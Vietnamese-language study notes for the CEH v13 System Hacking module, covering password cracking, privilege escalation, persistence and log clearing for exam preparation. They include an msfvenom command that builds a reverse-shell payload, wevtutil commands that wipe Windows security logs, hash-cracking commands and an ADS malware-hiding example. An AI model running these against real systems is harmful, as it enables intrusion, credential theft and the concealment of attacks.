# 📚 CEH v13 Study Notes - Module 06: System Hacking

> **[📝 LỜI KHUYÊN TỪ GIẢNG VIÊN - ĐỌC KỸ TRƯỚC KHI BẮT ĐẦU]**
> *   "Hãy nhớ nguyên tắc lõi: **AI is an overlay, not a replacement.** Công cụ như PassGAN dùng AI để đoán mật khẩu rất nhanh, nhưng nếu bạn không biết mã băm (Hash) là gì hay giao thức LM/NTLM hoạt động ra sao, bạn không thể bẻ khóa thành công."
> *   "Hãy **tự vẽ tay sơ đồ mindmap** cho quy trình System Hacking (CEH Methodology: Gaining Access -> Escalating Privileges -> Maintaining Access -> Clearing Logs)."

---

## 1. Module Overview (Dạy điều gì? Tại sao quan trọng?)
*   **Dạy điều gì:** Đây là "trái tim" của môn CEH. Module này hướng dẫn quy trình 4 bước để hoàn toàn chiếm quyền điều khiển một hệ thống (Windows/Linux) sau khi đã thu thập đủ thông tin từ các bước trước.
*   **Tại sao quan trọng:** Đây là mục tiêu tối thượng của hacker. Khi đã vào được hệ thống, hacker có thể đánh cắp dữ liệu, cài mã độc (Malware), hoặc dùng máy đó làm bàn đạp (Pivot) tấn công các máy khác trong mạng.

## 2. Core Concepts (Definition, Meaning, Why it matters)
*   **CEH System Hacking Methodology:** 
    1. **Gaining Access (Chiếm quyền):** Phá mật khẩu, khai thác lỗ hổng.
    2. **Escalating Privileges (Leo thang đặc quyền):** Từ User thường lên Admin/Root.
    3. **Maintaining Access (Duy trì truy cập):** Cài Backdoor, Rootkit, Trojan.
    4. **Clearing Logs (Xóa dấu vết):** Xóa nhật ký sự kiện để che giấu hành vi.
*   **Password Cracking:** Quá trình bẻ khóa mật khẩu (từ dạng Hash về dạng Plaintext).
*   **Rainbow Table:** Bảng chứa sẵn hàng triệu mã Hash của các mật khẩu thông dụng. Dùng để tra ngược Hash ra Password trong tíc tắc.
*   **Pass-the-Hash (PtH):** Kỹ thuật KHÔNG cần giải mã Hash. Hacker lấy thẳng cục Hash (NTLM) chèn vào session để đăng nhập thẳng vào hệ thống Windows.

## 3. KEYWORDS 
| Mức độ | Từ khóa | Ý nghĩa cốt lõi |
| :--- | :--- | :--- |
| 🔴 **MUST MEMORIZE** | **LM / NTLM Hash** | Chuẩn mã hóa mật khẩu kinh điển của Windows. LM rất yếu, NTLM mạnh hơn. |
| 🔴 **MUST MEMORIZE** | **SAM Database** | (Security Account Manager) Nơi chứa mật khẩu (Hash) của máy Windows nội bộ. Nằm ở `C:\Windows\System32\config\SAM`. |
| 🔴 **MUST MEMORIZE** | **Pass-the-Hash** | Đăng nhập bằng mã Hash mà không cần biết mật khẩu gốc. |
| 🟠 **HIGH PRIORITY** | **Rootkit** | Mã độc cấy sâu vào nhân (Kernel) hệ điều hành để tàng hình khỏi Anti-virus. |
| 🟠 **HIGH PRIORITY** | **Salting** | Thêm một chuỗi ngẫu nhiên vào mật khẩu trước khi băm (Hash) để chống lại Rainbow Table. |
| 🟡 **SHOULD KNOW** | **Alternate Data Streams (ADS)** | Tính năng của NTFS (Windows) cho phép giấu file độc hại đằng sau một file bình thường. |

## 4. TOOLS (Tool, Purpose, Used for, Important point)
| Tool Name | Phân loại | Mục đích & Ứng dụng | Điểm lưu ý quan trọng (Exam) |
| :--- | :--- | :--- | :--- |
| **Mimikatz** | Credential Dumper | Cào mật khẩu (plaintext), Hash, mã PIN từ bộ nhớ RAM (tiến trình LSASS) của Windows. | Tool bắt buộc phải biết của mọi Hacker. |
| **Hashcat** | Password Cracker | Bẻ khóa Hash siêu tốc bằng sức mạnh của Card đồ họa (GPU). | Nhanh nhất thế giới hiện nay. |
| **John the Ripper** | Password Cracker | Bẻ khóa đa năng (CPU-based), tự động nhận diện loại Hash. | Hay dùng trên Linux (Kali). |
| **Responder** | LLMNR/NBT-NS Poisoner | Nghe lén và đầu độc mạng nội bộ Windows để cướp NTLMv2 Hash. | Dùng trong giai đoạn Gaining Access mạng LAN. |
| **PassGAN** | **AI-Powered** | Dùng Generative Adversarial Networks (Mạng GAN) để tự học và sinh ra hàng triệu mật khẩu dự đoán chuẩn xác hơn con người. | Thay thế cho Wordlist truyền thống. |

## 5. COMMANDS (Command, Purpose, Important options)
*   **Bẻ khóa bằng Hashcat:**
    *   `hashcat -a 0 -m 1000 hash.txt wordlist.txt`: `-a 0` (Dictionary attack), `-m 1000` (NTLM Hash).
*   **Bẻ khóa bằng John the Ripper:**
    *   `john --format=NT hash.txt --wordlist=passwords.txt`: Bẻ khóa định dạng NT hash.
*   **Tạo mã độc bằng MSFvenom (Metasploit):**
    *   `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Port> -f exe > payload.exe`: Tạo file `.exe` chứa payload reverse shell.
*   **Xóa Logs trên Windows:**
    *   `wevtutil cl System` (Xóa System log), `wevtutil cl Security` (Xóa Security log).

## 6. ATTACKS & TECHNIQUES
*   **Password Cracking Types:**
    *   **Dictionary Attack:** Thử mật khẩu từ một danh sách có sẵn (Wordlist như `rockyou.txt`).
    *   **Brute-Force:** Thử mọi tổ hợp ký tự (a, b, c... aa, ab... 9999). Chậm nhất.
    *   **Rule-based Attack:** Lấy từ điển và áp dụng quy tắc (VD: thêm `123`, viết hoa chữ đầu -> `Admin123`).
*   **Privilege Escalation (Leo thang đặc quyền):**
    *   **Vertical (Dọc):** Lên quyền Admin/Root (Mục tiêu chính).
    *   **Horizontal (Ngang):** Đánh cắp quyền của một User khác ngang hàng (để truy cập tài liệu của họ).
*   **Bypassing UAC (User Account Control):** Vượt qua hộp thoại hỏi quyền Admin trên Windows bằng cách lợi dụng các file thực thi mặc định của hệ thống.
*   **Steganography (Giấu thư):** Kỹ thuật giấu dữ liệu (hoặc mã độc) vào trong một file hình ảnh, âm thanh, hoặc video (Tools: OpenStego, Snow).

## 7. PROTOCOLS/PORTS/SERVICES
*   **Kerberos (Port 88):** Giao thức xác thực mặc định của Active Directory. Lỗ hổng nổi tiếng: *Kerberoasting*, *Golden Ticket*.
*   **LSASS.exe:** Tiến trình (Process) cực kỳ quan trọng trên Windows quản lý xác thực. Mimikatz thường tiêm bộ nhớ vào đây để lấy pass.

## 8. IMPORTANT NUMBERS & FACTS
*   **LM Hash** giới hạn mật khẩu ở **14 ký tự**, và cắt đôi thành 2 mảnh 7 ký tự để mã hóa -> Cực kỳ dễ bẻ khóa. Do đó, Microsoft đã bỏ LM từ Windows Vista.
*   **SYSKEY:** Công cụ cũ của Windows mã hóa SAM database. (Đã bị loại bỏ từ Windows 10 RS3).

## 9. COMPARE & DIFFERENTIATE
| Kỹ thuật | Steganography (Giấu thư) | Cryptography (Mã hóa) |
| :--- | :--- | :--- |
| **Bản chất** | **Giấu sự tồn tại** của thông điệp (Nhìn vào chỉ thấy bức ảnh bình thường). | **Xáo trộn** thông điệp (Ai cũng thấy nó, nhưng không hiểu được). |
| **Mục tiêu** | Tàng hình. | Bảo mật nội dung. |

## 10. CEH EXAM FOCUS (Format ôn thi tốt)
*   **Thứ tự CEH Methodology:** Gaining Access -> Escalating Privileges -> Maintaining Access -> Clearing Logs. Đề bài rất hay hỏi bước nào đến trước/sau.
*   **Cơ chế bảo vệ Hash:** Đề hỏi: *"Làm sao để chống lại Rainbow Table?"* -> Đáp án là **Salting** (Thêm chuỗi ngẫu nhiên vào mật khẩu).
*   **Rootkit:** Nếu mô tả *"Malware thay thế các file lõi của hệ thống điều hành để ẩn mình khỏi Antivirus"* -> Đáp án: **Rootkit**.
*   **ADS (Alternate Data Streams):** Nếu câu hỏi nhắc đến kỹ thuật giấu file trên định dạng ổ cứng NTFS (như `type malware.exe > normal.txt:malware.exe`) -> Chọn **Alternate Data Streams**.

## 11. COMMON CONFUSIONS
*   **Vulnerability Exploitation vs System Hacking:** System Hacking là bức tranh lớn, bao gồm cả việc duy trì truy cập và xóa log. Khai thác lỗ hổng (Exploitation) chỉ là bước Gaining Access đầu tiên.
*   **Hashcat vs Mimikatz:** Hashcat dùng để **bẻ khóa** cục Hash (tốn hàng giờ/ngày). Mimikatz dùng để **cào thẳng** pass/Hash từ bộ nhớ RAM (chỉ mất vài giây nếu có quyền Admin).

## 12. REAL-WORLD CONTEXT
*   **Ransomware:** Hầu hết Ransomware đều áp dụng đúng quy trình System Hacking: Vào qua Email/Lỗ hổng -> Dùng công cụ leo quyền (Potato exploits) lên Admin -> Xóa file log & Shadow Copy (để không thể khôi phục) -> Mã hóa file và đòi tiền.
*   Trong mạng Doanh nghiệp (Active Directory), Hacker rất hiếm khi bẻ khóa Hash. Chúng sẽ cướp NTLM Hash bằng **Responder** và dùng kỹ thuật **Pass-the-Hash** để lây lan sang các máy khác mà không cần biết mật khẩu thật.

## 13. QUICK REVISION
1.  **Công cụ nào chuyên cào mật khẩu từ bộ nhớ tiến trình LSASS của Windows?** -> Mimikatz.
2.  **Kỹ thuật thêm dữ liệu ngẫu nhiên vào Hash để chống Rainbow Table gọi là gì?** -> Salting.
3.  **Tên file cơ sở dữ liệu chứa mã băm mật khẩu cục bộ trên Windows?** -> SAM.
4.  **Công cụ AI sinh mật khẩu tự động bằng mạng nơ-ron là gì?** -> PassGAN.
5.  **Tính năng NTFS nào dùng để giấu mã độc sau một file hợp lệ?** -> Alternate Data Streams (ADS).

## 14. MEMORY HOOKS
*   **G-E-M-C:** Quy trình hack hệ thống = **G**aining, **E**scalating, **M**aintaining, **C**learing logs.
*   **SAM:** **S**ecurity **A**ccount **M**anager (Chỗ giấu vàng của Windows cục bộ).
*   **Pass the Hash:** "Có vé là lên tàu, không cần biết vé mua bằng tiền gì". Mạng Windows chấp nhận Hash thay cho Password.
